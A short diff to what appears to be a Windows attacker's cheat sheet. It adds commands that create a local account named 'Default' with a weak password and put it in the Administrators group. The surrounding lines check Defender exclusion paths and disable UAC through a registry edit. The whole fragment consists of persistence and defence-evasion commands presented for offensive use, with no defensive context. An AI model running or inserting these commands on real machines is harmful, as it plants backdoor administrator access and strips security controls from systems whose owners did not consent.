@@ -132,6 +132,9 @@ to verify it was excluded :
 powershell -c "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath"
 ---------------------------------------------------------------------------------------------------------------
 with administrator privs 
+To create user and set to localgroup administrators :
+net user Default 123 /add
+net localgroup Administrators Default /add
 To disable UAC :
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
 TO verify it's disabled :
